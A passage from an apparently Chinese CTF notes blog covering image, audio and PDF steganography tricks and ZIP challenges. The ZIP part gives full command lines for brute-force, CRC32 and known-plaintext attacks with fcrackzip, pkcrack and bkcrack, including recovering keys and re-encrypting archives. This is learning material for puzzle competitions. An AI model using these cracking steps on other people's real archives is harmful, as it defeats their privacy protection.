cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure><p>python脚本跑的更精确一点，需要知道图片像素起始位置和结束位置，以及像素之间的间距（可以在PS里知道）</p><p>输入以下代码：（要注意有时候跑不出来可以复制到桌面上试试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python get_pixels.py -f comeon.png -p 0x0+3828x2148 -n 12x12</span><br><span class="line"># comeon.png 是待解密图片</span><br><span class="line"># 0x0 是图片里像素点起始位置，3828x2148 是图片里像素点结束位置</span><br><span class="line"># 12x12 是图片的像素点间距</span><br></pre></td></tr></table></figure><p>这个脚本跑出来更精细一点，也更推荐</p><h2 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a><u>cimbar</u></h2><p>对照表（简单的），项目地址： <a href="https://github.com/sz3/cimbar">https://github.com/sz3/cimbar</a></p><img src="2024-11-28 115212.png" alt="2024-11-28 115212" style="zoom:80%;"><h2 id="exiftool分析图片信息，如GPS"><a href="#exiftool分析图片信息，如GPS" class="headerlink" title="exiftool分析图片信息，如GPS"></a><u>exiftool分析图片信息，如GPS</u></h2><p>查看信息，记得要在对应目录下开终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\exiftool 1.jpg</span><br></pre></td></tr></table></figure><p>查看GPS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\exiftool -gps:all 1.jpg</span><br></pre></td></tr></table></figure><h2 id="Arnold猫脸变换"><a href="#Arnold猫脸变换" class="headerlink" title="Arnold猫脸变换"></a><u>Arnold猫脸变换</u></h2><p>参考链接： <a href="https://1cepeak.cn/post/arnold/">https://1cepeak.cn/post/arnold/</a></p><p>解密需要提供打乱次数，a，b 。</p><p>加密 &#x2F; 解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> img <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;图像加载失败，请检查文件路径或格式&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_encode</span>(<span class="params">image, shuffle_times, a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Arnold shuffle for rgb image</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        image: input original rgb image</span></span><br><span class="line"><span class="string">        shuffle_times: how many times to shuffle</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Arnold encode image</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1:创建新图像</span></span><br><span class="line">    arnold_image = np.zeros(shape=image.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2：计算N</span></span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = h   <span class="comment"># 或N=w</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3：遍历像素坐标变换</span></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> ori_x <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            <span class="keyword">for</span> ori_y <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">                <span class="comment"># 按照公式坐标变换</span></span><br><span class="line">                new_x = (<span class="number">1</span>*ori_x + b*ori_y)% N</span><br><span class="line">                new_y = (a*ori_x + (a*b+<span class="number">1</span>)*ori_y) % N</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 像素赋值</span></span><br><span class="line">                <span class="built_in">print</span>(image[ori_x, ori_y, :])</span><br><span class="line">                <span class="built_in">print</span>(arnold_image[new_x, new_y, :])</span><br><span class="line">                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;flag_arnold_encode.png&#x27;</span>, arnold_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> arnold_image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image, shuffle_times, a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; decode for rgb image that encoded by Arnold</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        image: rgb image encoded by Arnold</span></span><br><span class="line"><span class="string">        shuffle_times: how many times to shuffle</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        decode image</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1:创建新图像</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    <span class="comment"># 2：计算N</span></span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = h  <span class="comment"># 或N=w</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3：遍历像素坐标变换</span></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> ori_x <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            <span class="keyword">for</span> ori_y <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">                <span class="comment"># 按照公式坐标变换</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * ori_x + (-b) * ori_y) % N</span><br><span class="line">                new_y = ((-a) * ori_x + ori_y) % N</span><br><span class="line">                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;flag.png&#x27;</span>, decode_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line"><span class="comment"># arnold_encode(img, 1, 2, 3)</span></span><br><span class="line">arnold_decode(img, <span class="number">1</span>, <span class="number">29294</span>, <span class="number">7302244</span>)</span><br></pre></td></tr></table></figure><p>如果报错如下：</p><p>   decode_image &#x3D; np.zeros(shape&#x3D;image.shape) AttributeError: ‘NoneType’ object has no attribute ‘shape’</p><p>可以修改如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1:创建新图像，指定 dtype 为 uint8</span></span><br><span class="line">    arnold_image = np.zeros(shape=image.shape, dtype=np.uint8)</span><br></pre></td></tr></table></figure><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a><u>GIF</u></h2><p>gif一般是拆分gif</p><p>以及帧间隔里面可能藏东西</p><p>使用puzzlesolver即可</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a><u>二维码</u></h2><blockquote><p>[!NOTE]</p><p>扫描二维码实用排行:</p><p>T0：<code>Binary Eye</code>、<code>Umi-OCR</code></p><p>T0.5：<a href="https://qrcode-decoder.com/">在线网站</a> </p><p>T1：<code>CQR</code></p><p>T2：微信、夸克等</p><p>特殊：中国编码app</p></blockquote><p>.</p><p>1.得到的二维码可以用CQR扫一下，或者微信扫一下</p><p>在线二维码解码网站： <a href="https://qrcode-decoder.com/">https://qrcode-decoder.com</a></p><p>如果以上都没扫出来的话可以手机上下一个<code>Binary Eye</code>扫一下，或者用<code>Umi-OCR</code>（没想到吧这个也能扫二维码）试试看</p><p>注意汉信码扫不出来，需要去下中国编码app来扫（又称中国的二维码，特点就是四个角，且左下角方向是反的。）</p><p>汉信码例子长相：</p><img src="屏幕截图 2025-02-20 200323.png" alt="屏幕截图 2025-02-20 200323" style="zoom:33%;"><p>2.<strong>二维码也容易出拼接题目。</strong>如果是拼接题的话可以用<code>PS</code>或者<code>PPT</code>（修复同理）</p><h2 id="拼图题"><a href="#拼图题" class="headerlink" title="拼图题"></a><u>拼图题</u></h2><p>一般来说是碎的图片修复一下，有两种方式</p><p><strong>1.PS&#x2F;PPT</strong></p><p>可以用ppt来拼接图片，如果不行就用ps，需要ps的熟练度</p><p><strong>2.gaps&#x2F;Puzzle-Merak</strong></p><p>如果是一个文件夹下面多个碎掉的图片，我们先把他们拼成一张的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">montage *.PNG -tile 10x12 -geometry +0+0 out.png</span><br><span class="line">*.png表示匹配所有图片（这里也可以换成.jpg）</span><br><span class="line">-tile表示图片的张数</span><br><span class="line">-geometry +0+0表示每张图片的间距为0</span><br><span class="line">合成后要先查看图片的宽高（宽高要相等，不相等要用PS调整）</span><br></pre></td></tr></table></figure><p>然后就能得到一张全是碎图片拼接起来的图片了，顺序此时还没恢复过来。</p><p><strong>①gaps</strong></p><p>png的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=out.png --generation=30 --population=144 --size=30 --save </span><br><span class="line"></span><br><span class="line">--image 指向拼图的路径</span><br><span class="line">--size 拼图块的像素尺寸</span><br><span class="line">--generations 遗传算法的代的数量</span><br><span class="line">--population 个体数量</span><br><span class="line">--verbose 每一代训练结束后展示最佳结果</span><br><span class="line">--save 将拼图还原为图像</span><br></pre></td></tr></table></figure><p>jpg的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=flag.jpg --generations=50 --population=180 --size=125 --verbose</span><br><span class="line"></span><br><span class="line">-generations 你要迭代多少次</span><br><span class="line">-population 你有多少个小拼图</span><br><span class="line">--size 每张小图，也就是拼图小块的大小</span><br><span class="line">--verbose 实时显示</span><br></pre></td></tr></table></figure><p><strong>②Puzzle-Merak</strong></p><p>注意新建的时候要看好图片的像素大小！</p><p>选择<code>脚本-自动拼接（gaps）</code></p><p>这里需要我们填写<strong>generation、population、size 并用分号分开</strong></p><p>–generations 遗传算法的代的数量</p><p>–population 个体数量</p><p>–size 拼图块的像素尺寸</p><h1 id="PDF题"><a href="#PDF题" class="headerlink" title="PDF题"></a><u>PDF题</u></h1><h2 id="编辑pdf"><a href="#编辑pdf" class="headerlink" title="编辑pdf"></a><u>编辑pdf</u></h2><p>例如那种把图片底下有东西的题目</p><p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p>或者可以尝试使用pdf转word，然后编辑word</p><h1 id="音频题"><a href="#音频题" class="headerlink" title="音频题"></a><u>音频题</u></h1><h2 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a><u>思路：</u></h2><p>拿到不管三七二十一先拖进audacity看一下</p><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a><u>摩斯密码</u></h2><p>看频谱图的时候如果发现是摩斯密码我们直接对着摩斯密码手敲解密</p><h2 id="拨号音隐写——DTMF"><a href="#拨号音隐写——DTMF" class="headerlink" title="拨号音隐写——DTMF"></a><u>拨号音隐写——DTMF</u></h2><p>听着像是在拨号一般的声音，频谱图发现</p><img src="2024-11-28 115211.png" alt="2024-11-28 115211" style="zoom:75%;"><p>类似这样的是DTMF隐写</p><p>需要我们手敲</p><p>把最高和最低一一对应</p><blockquote><p>[!NOTE]</p><p>注意DTMF中频率只有697 Hz、770 Hz、852 Hz、941 Hz、 1209 Hz、1336 Hz、1477 Hz 和 1633 Hz</p></blockquote><p>上图手敲得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1336-697 1336-941 1336-697 1209-770 1336-941 1477-852 1477-697 1336-941 1336-697 1336-941 1336-697 1209-770 1209-697 1209-697 1336-941 1477-697</span><br></pre></td></tr></table></figure><p>然后复制进网站解密即可： <a href="https://www.dcode.fr/dtmf-code#:~:text=A%20DTMF%20code%20for%20dual-tone%20multi-frequency">https://www.dcode.fr/dtmf-code#:~:text&#x3D;A DTMF code for dual-tone multi-frequency</a></p><p>也可以试着把音频直接拖进随波逐流分析</p><h2 id="SSTV慢扫描"><a href="#SSTV慢扫描" class="headerlink" title="SSTV慢扫描"></a><u>SSTV慢扫描</u></h2><p>github项目： <a href="https://github.com/colaclanth/sstv">https://github.com/colaclanth/sstv</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sstv -d audio_file.wav -o result.png</span><br></pre></td></tr></table></figure><p>注意解码出来是一张图片</p><p>然后查看图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eog result.jpg </span><br><span class="line">或者v3m result.jpg</span><br></pre></td></tr></table></figure><p>。</p><p>如果github的sstv扫不出来的话可以使用<code>RX-SSTV</code></p><p>项目下载地址： <a href="https://www.qsl.net/on6mu/rxsstv.htm">https://www.qsl.net/on6mu/rxsstv.htm</a></p><p>可以配一个虚拟声卡使用，当然也可以直接扬声器。</p><h2 id="deepsound"><a href="#deepsound" class="headerlink" title="deepsound"></a><u>deepsound</u></h2><p>如果把音频拖进deepsound解密要密码的话一般就是deepsound隐写</p><p>密码看有没有其他地方得到</p><h2 id="silghteye隐写-1"><a href="#silghteye隐写-1" class="headerlink" title="silghteye隐写"></a><u>silghteye隐写</u></h2><p>当然音频也可以slighteye隐写，默认密码是silghteye</p><h2 id="窄带FM调制"><a href="#窄带FM调制" class="headerlink" title="窄带FM调制"></a><u>窄带FM调制</u></h2><p>一般拿到文件是GNU Radio流图的配置，它描述了一个无线通信系统的信号处理过程，包括信号生成、滤波、调制、解调等步骤。</p><p>利用 <strong>GNU Radio</strong>打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion file_name.grc</span><br></pre></td></tr></table></figure><h1 id="ZIP题"><a href="#ZIP题" class="headerlink" title="ZIP题"></a><u>ZIP题</u></h1><h2 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a><u>思路：</u></h2><p>zip有密码先看是不是伪加密，再看能不能爆破出来，要不要明文攻击，有没有注释，还有可能是脑洞。。</p><p>手动修复zip文件可以看看 <code>其他 &amp;&amp; 工具</code>里的 <code>010editor .zip模板对照表</code></p><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a><u>伪加密</u></h2><p>压缩源文件数据区：7-8位是frFlag</p><p>压缩源文件目录区：9-10位是deFlag</p><p>一般的出题人会修改这两个地方为奇数，从而显示出伪加密的样子</p><p>一般这俩地方都是09 00的，大概率就是伪加密了，具体可看zip文件结构</p><p>详细可以见我这篇博客 <a href="https://metaviii.github.io/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">关于ZIP伪加密 | MetaVi</a></p><p><strong>省流版：</strong></p><table><thead><tr><th align="center">工具</th><th align="center">建议&#x2F;判断位置</th></tr></thead><tbody><tr><td align="center">010</td><td align="center">建议两个区都修一下</td></tr><tr><td align="center">bandizip&#x2F;winrar</td><td align="center">判断dirEntry区中的deflag位</td></tr><tr><td align="center">7zip</td><td align="center">判断record区的frFlag位</td></tr><tr><td align="center">随波逐流修复伪加密</td><td align="center">只修改dirEntry区中的deflag位，不管frFlag位</td></tr><tr><td align="center">ZipCenOp</td><td align="center">不好用！</td></tr></tbody></table><h2 id="直接爆破"><a href="#直接爆破" class="headerlink" title="直接爆破"></a><u>直接爆破</u></h2><p><strong>1.archpr</strong></p><p>如果已知zip的密码很弱可以直接使用archpr来爆破密码</p><p>实际上感觉这个也用的比较多</p><p><strong>2.fcrackzip</strong></p><p>kali的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -v -D -p PASSWORD_FILE ZIP_FILE</span><br><span class="line">#-u 表示使用暴力攻击模式</span><br><span class="line">#-v 表示详细输出</span><br><span class="line">#-D 表示使用字典攻击模式</span><br><span class="line">#-p PASSWORD_FILE 表示指定密码字典文件</span><br><span class="line">#ZIP_FILE 表示要破解的 ZIP 文件</span><br></pre></td></tr></table></figure><p>我没怎么用过，感觉应该没有archpr好用</p><p><strong>3.passwarekit</strong></p><p>也可以用这个工具，比archpr好用，这个能爆破许多东西</p><h2 id="CRC32爆破"><a href="#CRC32爆破" class="headerlink" title="CRC32爆破"></a><u>CRC32爆破</u></h2><p>项目地址： <a href="https://github.com/allblue147/zip-crc-tools">https://github.com/allblue147/zip-crc-tools</a></p><p>crc爆破是里面文件很短，一般只有几字节的情况下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\main.py -f decode.zip</span><br></pre></td></tr></table></figure><p>特别需要注意的是要保证 zip 及里面 txt 的名字不能出现中文，有的话重命名一下</p><h2 id="掩码爆破"><a href="#掩码爆破" class="headerlink" title="掩码爆破"></a><u>掩码爆破</u></h2><p>已知部分明文，而且知道密钥的位数的情况下使用掩码爆破</p><p>利用archpr进行掩码爆破，不知道的部分改为  ? （注意是英文的问号）</p><h2 id="多个压缩包脚本解压"><a href="#多个压缩包脚本解压" class="headerlink" title="多个压缩包脚本解压"></a><u>多个压缩包脚本解压</u></h2><p>适用于有多个压缩包，而且密码是压缩包的名字</p><p>当然此类的压缩包还有很多，需要很多脚本，可以尝试ai跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_store_final_file</span>(<span class="params">initial_zip_path, target_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        os.makedirs(target_dir)</span><br><span class="line"> </span><br><span class="line">    current_zip_path = initial_zip_path</span><br><span class="line"> </span><br><span class="line">    password = os.path.basename(initial_zip_path)[:<span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(current_zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            files = zip_ref.namelist()</span><br><span class="line">            file_name = files[<span class="number">0</span>]</span><br><span class="line">            next_zip_name = os.path.join(target_dir, file_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(target_dir, pwd=<span class="built_in">bytes</span>(password, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Extracted <span class="subst">&#123;file_name&#125;</span> to <span class="subst">&#123;target_dir&#125;</span> using password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error extracting <span class="subst">&#123;file_name&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                current_zip_path = next_zip_name</span><br><span class="line">                password = file_name[:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;The final file is <span class="subst">&#123;file_name&#125;</span>, stored in <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">initial_zip_path = <span class="string">&#x27;0573.zip&#x27;</span> <span class="comment">#第一个解密的压缩包名称</span></span><br><span class="line">target_dir = <span class="string">&#x27;flag&#x27;</span> <span class="comment">#放进的文件夹</span></span><br><span class="line">extract_and_store_final_file(initial_zip_path, target_dir)</span><br></pre></td></tr></table></figure><h2 id="一些tips"><a href="#一些tips" class="headerlink" title="一些tips"></a><u>一些tips</u></h2><p>1.如果是连环套压缩包而且有zips，rar，7z等格式的小心是后缀换成摩斯密码解密。</p><p>2.空白名文件：出题人可能会把里面文件名字改为空白的，这样bandizip就解压不了了，多试试<code>7zip</code>解压吧！</p><p>3.多用用010的模板功能来看压缩包</p><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a><u>明文攻击</u></h2><p>明文攻击的压缩方式是store，如果是store的话一般就是需要明文攻击</p><h4 id="pkcrack——已知所有的明文或三段密钥"><a href="#pkcrack——已知所有的明文或三段密钥" class="headerlink" title="pkcrack——已知所有的明文或三段密钥"></a>pkcrack——<strong>已知所有的明文或三段密钥</strong></h4><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkcrack -c &quot;README.txt&quot; -p README.txt -C flag.zip -P README.zip</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-C:要破解的目标文件(含路径)</span><br><span class="line">-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)</span><br><span class="line">-P:压缩后的明文文件</span><br><span class="line">-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)</span><br></pre></td></tr></table></figure><p>三段密钥已知了的话也可以用Advanced Archive Password Recovery</p><h4 id="bkcrack——已知部分明文-部分文件的所有明文"><a href="#bkcrack——已知部分明文-部分文件的所有明文" class="headerlink" title="bkcrack——已知部分明文&#x2F;部分文件的所有明文"></a>bkcrack——已知部分明文&#x2F;部分文件的所有明文</h4><p><strong>参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-c 要解密的文件</span><br><span class="line">-P 已知明文所在的压缩包</span><br><span class="line">-p 已知的明文部分</span><br><span class="line">-x 压缩包内目标文件的偏移地址  部分已知明文值</span><br><span class="line">-C 加密压缩包</span><br><span class="line">-o offset  -p参数指定的明文在压缩包内目标文件的偏移量</span><br><span class="line">-k 后面加破解出的三段密钥</span><br><span class="line">-d 后面加解密后数据的保存位置</span><br><span class="line">-U 修改压缩包密码并导出bkcrack -C flag.zip -c hint.jpg -k afb9fee3 f8795353 f6de1d4e -U out.zip 114514</span><br></pre></td></tr></table></figure><p><strong>1.已知部分文件里的部分明文</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">至少已知明文的12个字节及偏移，其中至少8字节需要连续。</span><br><span class="line">明文对应的文件加密方式为ZipCrypto Store</span><br><span class="line">Tips：进行明文攻击前要判断制作压缩包的压缩工具，然后对已知明文使用特定工具进行压缩，再进行明文攻击</span><br><span class="line">例子：bkcrack -C \$R9EG7XR.zip -c flag.txt -k 958597ea b9f7740b 622aed5e -d flag.txt</span><br></pre></td></tr></table></figure><p>已知的部分明文可以是zip的文件名字</p><p><strong>2.已知一个zip里的一个文件的全部内容</strong></p><p>例如一个zip里包含 flag.txt 和 md5.txt，可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 222.zip -c md5.txt -P 11.zip -p flag.txt</span><br><span class="line"># 222.zip是待解密zip，md5是已知的txt</span><br><span class="line"># 新建一个flag.txt，内容是md5一样的，打包成11.zip</span><br></pre></td></tr></table></figure><p>或者可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 222.zip -c important-md5.txt  -p flag.txt</span><br><span class="line"># 不打包成11.zip</span><br></pre></td></tr></table></figure><p>就可以明文攻击三段密钥了。</p><p><strong>3.已知三串密钥</strong></p><p>&#x3D;&gt;&gt;拿到了三串密钥之后可以改加密密码另存文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 222.zip -k 119be489 086fed79 8cbf1ed7 -U out.zip 1234</span><br><span class="line"># 222.zip是待解密的zip</span><br><span class="line"># -k后面跟的是三段密钥</span><br><span class="line"># -U 表示转出为out.zip，密码是1234</span><br></pre></td></tr></table></figure><p>或者爆破出原本密码（知道密码长度）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -k 119be489 086fed79 8cbf1ed7 -r 11 \?b</span><br><span class="line"># -k后面跟的是三段密钥</span><br><span class="line"># 11 是已知的密码的长度</span><br><span class="line"># 